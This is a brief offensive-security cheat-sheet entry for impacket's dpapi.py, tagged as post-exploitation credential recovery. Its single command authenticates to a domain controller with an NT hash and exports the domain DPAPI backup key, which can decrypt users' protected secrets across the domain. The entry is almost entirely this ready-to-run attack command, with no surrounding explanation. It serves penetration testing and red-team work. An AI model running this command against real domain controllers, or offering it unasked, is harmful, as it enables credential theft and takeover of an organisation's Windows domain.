# dpapi (imp)

% impacket-secrets, windows, smb, 445

## dump the domain backup key
#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
dpapi.py backupkeys --export -hashes <nt_hash>  -t  <domain_fqdn>/<user|Administrator>@<dc_ip>
```